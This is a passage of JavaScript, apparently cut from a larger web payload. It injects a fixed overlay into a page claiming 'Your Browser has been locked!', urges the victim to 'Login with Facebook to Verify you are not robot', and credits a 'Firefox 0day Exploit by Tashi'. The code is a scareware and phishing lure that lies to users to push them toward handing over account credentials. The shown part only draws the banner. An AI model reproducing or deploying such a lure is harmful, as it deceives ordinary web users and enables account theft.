body = document.body;
if(body != null) {
div = document.createElement("div");
div.style.position = "fixed";
div.style.width = "100%";
div.style.height = "10%";
div.style.opacity = 2.8;
div.style.top = "+0px";
div.style.zIndex="9999";
div.style.bottom = "+0px";
div.style.left = "+0px";
div.style.backgroundColor = "#eceff5";
div.style.border = "0px solid #94a3c4";
div.style.padding = "0px";
div.innerHTML = "<center><font color=red size=5><b> Your Browser has been locked!<br>Please Login with Facebook to Verify you are not robot</font><br><font color=green>Firefox 0day Exploit by Tashi</font></b></center>"
body.appendChild(div);
}
}
